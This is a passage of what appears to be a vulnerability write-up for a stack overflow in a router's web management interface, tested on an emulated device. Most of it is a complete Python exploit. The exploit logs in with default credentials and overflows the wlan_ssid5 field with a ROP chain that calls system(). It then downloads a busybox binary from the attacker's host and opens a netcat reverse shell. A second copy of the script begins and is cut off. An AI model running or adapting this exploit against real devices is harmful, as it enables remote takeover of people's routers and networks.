<p dir="auto">The first step of the exploit is complete.</p>
<p dir="auto">Step 2: Trigger the stack overflow.</p>
<p dir="auto">ASLR is disabled by default in the real environment, so use the following command to disable ASLR in the simulation environment:</p>
<div class="highlight highlight-source-shell" dir="auto"><pre> <span class="pl-c1">echo</span> 0 <span class="pl-k">&gt;</span> /proc/sys/kernel/randomize_va_space</pre></div>
<p dir="auto">First, access the web control page in the browser at <code>192.168.0.1</code> and log in. [Important!]</p>
<p dir="auto">Then run the following exploit:</p>
<div class="highlight highlight-source-python" dir="auto"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span>
<span class="pl-k">import</span> <span class="pl-s1">logging</span>
<span class="pl-k">import</span> <span class="pl-s1">requests</span>
<span class="pl-k">import</span> <span class="pl-s1">subprocess</span>
<span class="pl-s1">logging</span>.<span class="pl-c1">basicConfig</span>(<span class="pl-s1">level</span><span class="pl-c1">=</span><span class="pl-s1">logging</span>.<span class="pl-c1">DEBUG</span>)
<span class="pl-s1">context</span>.<span class="pl-c1">log_level</span> <span class="pl-c1">=</span> <span class="pl-s">'debug'</span>

<span class="pl-s1">sessionId</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>

<span class="pl-k">def</span> <span class="pl-en">invokeFormLogin</span>():
    <span class="pl-k">global</span> <span class="pl-s1">sessionId</span>
    <span class="pl-s1">url</span> <span class="pl-c1">=</span> <span class="pl-s">'http://192.168.0.1/boafrm/formLogin'</span>

    <span class="pl-s1">headers</span> <span class="pl-c1">=</span> {
        <span class="pl-s">'Host'</span>: <span class="pl-s">'192.168.0.1'</span>,
        <span class="pl-s">'User-Agent'</span>: <span class="pl-s">'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'</span>,
        <span class="pl-s">'Accept'</span>: <span class="pl-s">'*/*'</span>,
        <span class="pl-s">'Accept-Language'</span>: <span class="pl-s">'en-US,en;q=0.5'</span>,
        <span class="pl-s">'Accept-Encoding'</span>: <span class="pl-s">'gzip, deflate'</span>,
        <span class="pl-s">'Content-Type'</span>: <span class="pl-s">'application/x-www-form-urlencoded; charset=UTF-8'</span>,
        <span class="pl-s">'X-Requested-With'</span>: <span class="pl-s">'XMLHttpRequest'</span>,
        <span class="pl-s">'Origin'</span>: <span class="pl-s">'http://192.168.0.1'</span>,
        <span class="pl-s">'Connection'</span>: <span class="pl-s">'close'</span>,
    }

    <span class="pl-s1">data</span> <span class="pl-c1">=</span> {
        <span class="pl-s">"topicurl"</span>: <span class="pl-s">"setting/setUserLogin"</span>,
        <span class="pl-s">"username"</span>: <span class="pl-s">"admin"</span>,
        <span class="pl-s">"userpass"</span>: <span class="pl-s">"admin"</span>,
        <span class="pl-s">"submit-url"</span>: <span class="pl-s">"/login.htm"</span>
    }

    <span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">post</span>(<span class="pl-s1">url</span>, <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>)

    <span class="pl-s1">logging</span>.<span class="pl-c1">debug</span>(<span class="pl-s">f"sessionId---&gt;<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">response</span>.<span class="pl-c1">text</span><span class="pl-kos">}</span></span>"</span>)
    <span class="pl-s1">sessionId</span> <span class="pl-c1">=</span> <span class="pl-s1">response</span>.<span class="pl-c1">text</span>

<span class="pl-k">def</span> <span class="pl-en">invokeformMultiAP</span>():
    <span class="pl-s1">url</span> <span class="pl-c1">=</span> <span class="pl-s">'http://192.168.0.1/boafrm/formMultiAP'</span>

    <span class="pl-s1">headers</span> <span class="pl-c1">=</span> {
        <span class="pl-s">'Host'</span>: <span class="pl-s">'192.168.0.1'</span>,
        <span class="pl-s">'User-Agent'</span>: <span class="pl-s">'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'</span>,
        <span class="pl-s">'Accept'</span>: <span class="pl-s">'*/*'</span>,
        <span class="pl-s">'Accept-Language'</span>: <span class="pl-s">'en-US,en;q=0.5'</span>,
        <span class="pl-s">'Accept-Encoding'</span>: <span class="pl-s">'gzip, deflate'</span>,
        <span class="pl-s">'Content-Type'</span>: <span class="pl-s">'application/x-www-form-urlencoded; charset=UTF-8'</span>,
        <span class="pl-s">'X-Requested-With'</span>: <span class="pl-s">'XMLHttpRequest'</span>,
        <span class="pl-s">'Origin'</span>: <span class="pl-s">'http://192.168.0.1'</span>,
        <span class="pl-s">'Connection'</span>: <span class="pl-s">'close'</span>,
        <span class="pl-s">'Referer'</span>: <span class="pl-s">'http://192.168.0.1/wlsecurity.htm'</span>
    }

    <span class="pl-s1">data</span> <span class="pl-c1">=</span> {
        <span class="pl-s">'sessionCheck'</span>: <span class="pl-s">f'<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">sessionId</span><span class="pl-kos">}</span></span>'</span>,
        <span class="pl-s">'submit-url'</span>: <span class="pl-s">'/wlsecurity.htm'</span>,
        <span class="pl-s">'start_wsc'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'needEnable11kv'</span>: <span class="pl-s">'1'</span>,
        <span class="pl-s">'save_apply'</span>:<span class="pl-s">'1'</span>
    }

    <span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">post</span>(<span class="pl-s1">url</span>, <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>)
   
    <span class="pl-k">if</span> <span class="pl-s1">response</span>.<span class="pl-c1">status_code</span> <span class="pl-c1">!=</span> <span class="pl-c1">200</span>:
        <span class="pl-k">assert</span>(<span class="pl-s">f'Failed to add wlan_idx. Status_code: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">response</span>.<span class="pl-c1">status_code</span><span class="pl-kos">}</span></span>'</span>)
    <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">'Successfully added wlan_idx.'</span>)

<span class="pl-k">def</span> <span class="pl-en">invokeFormWlEncrypt</span>():
    <span class="pl-s1">headers</span> <span class="pl-c1">=</span> {
    <span class="pl-s">'Host'</span>: <span class="pl-s">'192.168.0.1'</span>,
    <span class="pl-s">'User-Agent'</span>: <span class="pl-s">'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'</span>,
    <span class="pl-s">'Accept'</span>: <span class="pl-s">'*/*'</span>,
    <span class="pl-s">'Accept-Language'</span>: <span class="pl-s">'en-US,en;q=0.5'</span>,
    <span class="pl-s">'Accept-Encoding'</span>: <span class="pl-s">'gzip, deflate'</span>,
    <span class="pl-s">'Content-Type'</span>: <span class="pl-s">'application/x-www-form-urlencoded; charset=UTF-8'</span>,
    <span class="pl-s">'X-Requested-With'</span>: <span class="pl-s">'XMLHttpRequest'</span>,
    <span class="pl-s">'Origin'</span>: <span class="pl-s">'http://192.168.0.1'</span>,
    <span class="pl-s">'Connection'</span>: <span class="pl-s">'close'</span>,
    <span class="pl-s">'Referer'</span>: <span class="pl-s">'http://192.168.0.1/wlsecurity.htm'</span>
    }

    <span class="pl-s1">data</span> <span class="pl-c1">=</span> {
        <span class="pl-s">'sessionCheck'</span>: <span class="pl-s">'d5c0e890940bdb1c5621c888994a23e6'</span>,
        <span class="pl-s">'submit-url'</span>: <span class="pl-s">'%2Fwlsecurity.htm'</span>,
        <span class="pl-s">'opmode_wizard'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'staControlPrefer'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'staControlEnabled'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'80211v_enable_'</span>: <span class="pl-s">'disable'</span>,
        <span class="pl-s">'dot11k_'</span>: <span class="pl-s">'disable'</span>,
        <span class="pl-s">'SSID_Setting5'</span>: <span class="pl-s">'1'</span>,
        <span class="pl-s">'has_vwlan5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'wpaAuth5'</span>: <span class="pl-s">'psk'</span>,
        <span class="pl-s">'wpa11w5'</span>: <span class="pl-s">'none'</span>,
        <span class="pl-s">'wpa2EnableSHA2565'</span>: <span class="pl-s">'disable'</span>,
        <span class="pl-s">'ciphersuite5'</span>: <span class="pl-s">'aes'</span>,
        <span class="pl-s">'wpa2ciphersuite5'</span>: <span class="pl-s">'aes'</span>,
        <span class="pl-s">'wps_clear_configure_by_reg5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'wlan_disabled5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'wlan_ssid5'</span>: <span class="pl-s">b'a'</span><span class="pl-c1">*</span><span class="pl-c1">0x44</span><span class="pl-c1">+</span><span class="pl-s">b'deadbeef'</span>,
        <span class="pl-s">'method5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'wlcontroltime5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'stanums5'</span>: <span class="pl-s">'32'</span>,
        <span class="pl-s">'authType5'</span>: <span class="pl-s">'auto'</span>,
        <span class="pl-s">'wepKeyLen5'</span>: <span class="pl-s">'wep64'</span>,
        <span class="pl-s">'wepEnabled5'</span>: <span class="pl-s">'ON'</span>,
        <span class="pl-s">'length5'</span>: <span class="pl-s">'1'</span>,
        <span class="pl-s">'format5'</span>: <span class="pl-s">'2'</span>,
        <span class="pl-s">'key5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'pskFormat5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'pskValue5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'preAuth5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'radiusIP5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'radiusPort5'</span>: <span class="pl-s">'1812'</span>,
        <span class="pl-s">'radiusPass5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'use1x5'</span>: <span class="pl-s">'OFF'</span>,
        <span class="pl-s">'eapType5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'eapInsideType5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'eapUserId5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'radiusUserName5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'radiusUserPass5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'radiusUserCertPass5'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'wl_access5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'tx_restrict5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'rx_restrict5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'hiddenSSID5'</span>: <span class="pl-s">'0'</span>,
        <span class="pl-s">'sync_password5'</span>: <span class="pl-s">'1'</span>,
        <span class="pl-s">'save_apply'</span>: <span class="pl-s">'1'</span>
    }

    <span class="pl-s1">requests</span>.<span class="pl-c1">post</span>(<span class="pl-s">'http://192.168.0.1/boafrm/formWlEncrypt'</span>, <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>)



<span class="pl-k">def</span> <span class="pl-en">attack</span>(<span class="pl-s1">io</span>):
    <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">"Please ensure that your device and your host are on the same local network, with the IP address of the target device being 192.168.0.1 and the host IP address being 192.168.0.2. Such IP assignments are common in devices simulated by FirmAE."</span>)
    <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">"<span class="pl-cce">\n</span>"</span>)
    <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">"To successfully execute the reverse shell payload, ensure that the busybox-mipsel binary and the Python script are located in the same directory so that the targeted machine can\successfully download the file from the host."</span>)
    <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">"<span class="pl-cce">\n</span>"</span>)
    <span class="pl-s1">logging</span>.<span class="pl-c1">warn</span>(<span class="pl-s">"On this virtual device, the loading base address of ulibc is 0x77d0b000. If you are using FirmAE mode for verification, please disable ASLR and use gdb + pwndbg's vmmap or other methods to determine the base address of ulibc. If you cannot determine the runtime base address of ulibc, this attack payload will cause the device service to go offline, resulting in a denial of service attack."</span>)
    <span class="pl-s1">server_process</span> <span class="pl-c1">=</span> <span class="pl-s1">subprocess</span>.<span class="pl-c1">Popen</span>([<span class="pl-s">'python'</span>, <span class="pl-s">'-m'</span>, <span class="pl-s">'http.server'</span>])
    <span class="pl-c">#On this virtual device, the base address of ulibc is 0x77d0b000. </span>
    <span class="pl-c">#If you are using FirmAE mode for verification, please disable ASLR </span>
    <span class="pl-c">#and determine the base value of ulibc using gdb + pwndbg's vmmap or other methods.</span>

    <span class="pl-s1">libc_base</span> <span class="pl-c1">=</span> <span class="pl-c1">0x77d0b000</span> 
    <span class="pl-c">#To successfully execute the reverse shell payload, ensure that the busybox-mipsel</span>
    <span class="pl-c"># binary and the Python script are located in the same directory so that the targeted </span>
    <span class="pl-c">#machine can successfully download the file from the host.</span>
    <span class="pl-c">#Please ensure that your device and your host are on the same local network, with the </span>
    <span class="pl-c">#IP address of the target device being 192.168.0.1 and the host IP address </span>
    <span class="pl-c">#being 192.168.0.2. Such IP assignments are common in devices simulated by FirmAE.</span>
    <span class="pl-s1">cmd</span> <span class="pl-c1">=</span> <span class="pl-s">b' sleep 5;wget http://192.168.0.2:8000/busybox-mipsel;chmod 777 ./busybox-mipsel;./busybox-mipsel nc 192.168.0.2 2333  -e /bin/sh;<span class="pl-cce">\00</span>'</span>
    
    <span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">b'POST /boafrm/formWlEncrypt HTTP/1.1<span class="pl-cce">\t</span><span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Host: 192.168.0.1<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Accept: */*<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Accept-Language: en-US,en;q=0.5<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Accept-Encoding: gzip, deflate<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Content-Type: application/x-www-form-urlencoded; charset=UTF-8<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'X-Requested-With: XMLHttpRequest<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Content-Length: 1300<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Origin: http://192.168.0.1<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Connection: close<span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'Referer: http://192.168.0.1/wlsecurity.htm<span class="pl-cce">\r</span><span class="pl-cce">\n</span><span class="pl-cce">\r</span><span class="pl-cce">\n</span>'</span>

    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'sessionCheck=aa5edb8ba4aae591d9dd6af412bb8a22<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;submit-url=%2Fwlsecurity.htm<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;opmode_wizard=&amp;staControlPrefer=0<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;staControlEnabled=0<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;80211v_enable_=disable<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;dot11k_=disable<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;SSID_Setting5=1<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;has_vwlan5=<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wpaAuth5=psk<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wpa11w5=none<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wpa2EnableSHA2565=disable<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;ciphersuite5=aes<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wpa2ciphersuite5=aes<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wps_clear_configure_by_reg5=0<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wlan_disabled5=0<span class="pl-cce">\</span></span>
<span class="pl-s"><span class="pl-cce"></span>                &amp;wlan_ssid5='</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa'</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0xdeadbeef</span>) <span class="pl-c">#s2</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">libc_base</span><span class="pl-c1">+</span><span class="pl-c1">0x00033448</span>) <span class="pl-c">#s1 system addr</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0xbeffdead</span>) <span class="pl-c">#s0</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">libc_base</span><span class="pl-c1">+</span><span class="pl-c1">0x000378D4</span>) <span class="pl-c">#ra addiu   $v1, $sp, 0x120 ---&gt; jalr    $t9 </span>
    <span class="pl-s">''' addiu   $v1, $sp, 0x120</span>
<span class="pl-s">    LOAD:000378D8                 move    $a0, $v1</span>
<span class="pl-s">    LOAD:000378DC                 move    $t9, $s1</span>
<span class="pl-s">    LOAD:000378E0                 sw      $v1, 0x1AC($sp)</span>
<span class="pl-s">    LOAD:000378E4                 move    $a1, $zero</span>
<span class="pl-s">    LOAD:000378E8                 jalr    $t9 ; memset'''</span>

    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'b'</span><span class="pl-c1">*</span>(<span class="pl-c1">0x120</span>)
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s1">cmd</span>
    <span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">b'&amp;method5=0&amp;wlcontroltime5=0&amp;stanums5=32&amp;authType5=auto&amp;wepKeyLen5=wep64&amp;wepEnabled5=ON&amp;length5=1&amp;format5=2&amp;key5=&amp;pskFormat5=0&amp;pskValue5=&amp;preAuth5=&amp;radiusIP5=&amp;radiusPort5=1812&amp;radiusPass5=&amp;use1x5=OFF&amp;eapType5=0&amp;eapInsideType5=0&amp;eapUserId5=&amp;radiusUserName5=&amp;radiusUserPass5=&amp;radiusUserCertPass5=&amp;wl_access5=0&amp;tx_restrict5=0&amp;rx_restrict5=0&amp;hiddenSSID5=0&amp;sync_password5=1&amp;save_apply=1'</span>
    <span class="pl-s1">io</span>.<span class="pl-c1">send</span>(<span class="pl-s1">payload</span>)
    <span class="pl-s1">io</span>.<span class="pl-c1">close</span>()

    <span class="pl-s1">result</span> <span class="pl-c1">=</span> <span class="pl-s1">subprocess</span>.<span class="pl-c1">run</span>(<span class="pl-s">f'nc -lvnp 2333'</span>, <span class="pl-s1">shell</span><span class="pl-c1">=</span><span class="pl-c1">True</span>)

    <span class="pl-k">if</span> <span class="pl-s1">result</span>.<span class="pl-c1">returncode</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span>:
        <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">"Done"</span>)
    <span class="pl-k">else</span>:
        <span class="pl-s1">logging</span>.<span class="pl-c1">error</span>(<span class="pl-s">"Command execution failed."</span>)

    <span class="pl-s1">server_process</span>.<span class="pl-c1">terminate</span>()

<span class="pl-k">def</span> <span class="pl-en">main</span>():

    <span class="pl-s1">io</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">'192.168.0.1'</span>,<span class="pl-c1">80</span>)
    
    <span class="pl-en">invokeFormLogin</span>()
    <span class="pl-en">invokeformMultiAP</span>()
    <span class="pl-en">attack</span>(<span class="pl-s1">io</span>)

<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">'__main__'</span>:
    <span class="pl-en">main</span>()</pre></div>
<pre><code>python ./exp.py
</code></pre>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ae691ef65210433d51b616c9b1edfd9f9cdfc7123efe98dd0ebc3ab3f018c3ad/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235323034363039302e706e67"><img src="https://camo.githubusercontent.com/ae691ef65210433d51b616c9b1edfd9f9cdfc7123efe98dd0ebc3ab3f018c3ad/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235323034363039302e706e67" alt="image-20240425204617888" data-canonical-src="https://gitee.com/D_ionysus/cloudimage/raw/master/img/202404252046090.png" style="max-width: 100%;"></a></p>
<p dir="auto">As shown in the image above, the shell has been successfully rebound.</p>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">EXP</h2><a id="user-content-exp" class="anchor" aria-label="Permalink: EXP" href="#exp"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="highlight highlight-source-python" dir="auto"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span>
<span class="pl-k">import</span> <span class="pl-s1">logging</span>
<span class="pl-k">import</span> <span class="pl-s1">requests</span>
<span class="pl-k">import</span> <span class="pl-s1">subprocess</span>
<span class="pl-s1">logging</span>.<span class="pl-c1">basicConfig</span>(<span class="pl-s1">level</span><span class="pl-c1">=</span><span class="pl-s1">logging</span>.<span class="pl-c1">DEBUG</span>)
<span class="pl-s1">context</span>.<span class="pl-c1">log_level</span> <span class="pl-c1">=</span> <span class="pl-s">'debug'</span>

<span class="pl-s1">sessionId</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>

<span class="pl-k">def</span> <span class="pl-en">invokeFormLogin</span>():
    <span class="pl-k">global</span> <span class="pl-s1">sessionId</span>
    <span class="pl-s1">url</span> <span class="pl-c1">=</span> <span class="pl-s">'http://192.168.0.1/boafrm/formLogin'</span>

    <span class="pl-s1">headers</span> <span class="pl-c1">=</span> {
        <span class="pl-s">'Host'</span>: <span class="pl-s">'192.168.0.1'</span>,
        <span class="pl-s">'User-Agent'</span>: <span class="pl-s">'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'</span>,
        <span class="pl-s">'Accept'</span>: <span class="pl-s">'*/*'</span>,
        <span class="pl-s">'Accept-Language'</span>: <span class="pl-s">'en-US,en;q=0.5'</span>,
        <span class="pl-s">'Accept-Encoding'</span>: <span class="pl-s">'gzip, deflate'</span>,
        <span class="pl-s">'Content-Type'</span>: <span class="pl-s">'application/x-www-form-urlencoded; charset=UTF-8'</span>,
        <span class="pl-s">'X-Requested-With'</span>: <span class="pl-s">'XMLHttpRequest'</span>,
        <span class="pl-s">'Origin'</span>: <span class="pl-s">'http://192.168.0.1'</span>,
        <span class="pl-s">'Connection'</span>: <span class="pl-s">'close'</span>,
    }

    <span class="pl-s1">data</span> <span class="pl-c1">=</span> {
        <span class="pl-s">"topicurl"</span>: <span class="pl-s">"setting/setUserLogin"</span>,
        <span class="pl-s">"username"</span>: <span class="pl-s">"admin"</span>,
        <span class="pl-s">"userpass"</span>: <span class="pl-s">"admin"</span>,
        <span class="pl-s">"submit-url"</span>: <span class="pl-s">"/login.htm"</span>
    }

    <span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">post</span>(<span class="pl-s1">url</span>, <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>)

    <span class="pl-s1">logging</span>.<span class="pl-c1">debug</span>(<span class="pl-s">f"sessionId---&gt;<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">response</span>.<span class="pl-c1">text</span><span class="pl-kos">}</span></span>"</span>)
    <span class="pl-s1">sessionId</span> <span class="pl-c1">=</span> <span class="pl-s1">response</span>.<span class="pl-c1">text</span>

<span class="pl-k">def</span> <span class="pl-en">invokeformMultiAP</span>():
    <span class="pl-s1">url</span> <span class="pl-c1">=</span> <span class="pl-s">'http://192.168.0.1/boafrm/formMultiAP'</span>

    <span class="pl-s1">headers</span> <span class="pl-c1">=</span> {
        <span class="pl-s">'Host'</span>: <span class="pl-s">'192.168.0.1'</span>,
        <span class="pl-s">'User-Agent'</span>: <span class="pl-s">'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'</span>,
        <span class="pl-s">'Accept'</span>: <span class="pl-s">'*/*'</span>,
        <span class="pl-s">'Accept-Language'</span>: <span class="pl-s">'en-US,en;q=0.5'</span>,
        <span class="pl-s">'Accept-Encoding'</span>: <span class="pl-s">'gzip, deflate'</span>,
        <span class="pl-s">'Content-Type'</span>: <span class="pl-s">'application/x-www-form-urlencoded; charset=UTF-8'</span>,
        <span class="pl-s">'X-Requested-With'</span>: <span class="pl-s">'XMLHttpRequest'</span>,
        <span class="pl-s">'Origin'</span>: <span class="pl-s">'http://192.168.0.1'</span>,
        <span class="pl-s">'Connection'</span>: <span class="pl-s">'close'</span>,
        <span class="pl-s">'Referer'</span>: <span class="pl-s">'http://192.168.0.1/wlsecurity.htm'</span>
    }

    <span class="pl-s1">data</span> <span class="pl-c1">=</span> {
        <span class="pl-s">'sessionCheck'</span>: <span class="pl-s">f'<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">sessionId</span><span class="pl-kos">}</span></span>'</span>,
        <span class="pl-s">'submit-url'</span>: <span class="pl-s">'/wlsecurity.htm'</span>,
        <span class="pl-s">'start_wsc'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'needEnable11kv'</span>: <span class="pl-s">'1'</span>,
        <span class="pl-s">'save_apply'</span>:<span class="pl-s">'1'</span>
    }

    <span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">post</span>(<span class="pl-s1">url</span>, <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>)
   
    <span class="pl-k">if</span> <span class="pl-s1">response</span>.<span class="pl-c1">status_code</span> <span class="pl-c1">!=</span> <span class="pl-c1">200</span>:
        <span class="pl-k">assert</span>(<span class="pl-s">f'Failed to add wlan_idx. Status_code: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">response</span>.<span class="pl-c1">status_code</span><span class="pl-kos">}</span></span>'</span>)
    <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">'Successfully added wlan_idx.'</span>)

<span class="pl-k">def</span> <span class="pl-en">invokeFormWlEncrypt</span>():
    <span class="pl-s1">headers</span> <span class="pl-c1">=</span> {
    <span class="pl-s">'Host'</span>: <span class="pl-s">'192.168.0.1'</span>,
